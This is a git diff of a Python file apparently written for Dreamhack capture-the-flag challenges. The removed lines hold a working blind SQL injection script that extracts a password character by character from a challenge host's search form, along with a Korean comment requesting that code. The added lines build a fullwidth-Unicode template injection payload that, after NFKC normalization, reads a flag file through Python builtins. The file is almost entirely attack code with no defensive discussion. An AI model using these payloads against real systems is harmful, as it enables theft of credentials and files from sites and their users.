@@ -1,50 +1,8 @@
-import requests
-import string
+import unicodedata
 
-# 대상 URL
-url = "http://host3.dreamhack.games:10970/search"
-
-# 무작위 대조를 위한 문자셋 (숫자 + 알파벳 소문자 + 대문자)
-char_set = string.digits + string.ascii_letters + "_{}" 
-
-def solve():
-    password = ""
-    print("[+] Start cracking the password...")
-
-    for i in range(1, 33): # 비밀번호 길이를 모를 경우 넉넉하게 설정
-        found = False
-        for char in char_set:
-            # Blind SQL Injection 페이로드
-            # SUBSTR(password, 위치, 길이)를 사용하여 i번째 글자가 char인지 확인
-            payload = f"%' AND (SELECT SUBSTR(password,{i},1) FROM users) = '{char}'--"
-            
-            # POST 방식으로 데이터 전송
-            data = {'query': payload}
-            response = requests.post(url, data=data)
-
-            # 응답 내용에 "Found!"가 있으면 해당 문자가 맞는 것
-            if "Found!" in response.text:
-                password += char
-                print(f"[+] Current Password: {password}")
-                found = True
-                break
-        
-        if not found:
-            print(f"[!] Finished. Total Password: {password}")
-            break
-
-if __name__ == "__main__":
-    solve()
-
-
-# http://host3.dreamhack.games:10970/search 이 주소의 입력칸인 query에 
-# %' AND (SELECT SUBSTR(password,1,1) FROM users) = 'ch'--
-# 위 명령어의 ch를 a~z까지 바꿔서 보내는 파이썬 코드를 작성해줘
-
-
-
-# %' AND (SELECT SUBSTR(password,1,1) FROM users) = 'a'--
-
+msg = "｛｛　ｓｅｌｆ．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿［＇＿＿ｂｕｉｌｔｉｎｓ＿＿＇］［＇ｏｐｅｎ＇］（＇／ｈｏｍｅ／ｈａｎｇｕｌ／ｆｌａｇ＇）．ｒｅａｄ（）　｝｝"
+msg = unicodedata.normalize("NFKC", msg)
+print(msg)
 
 
 
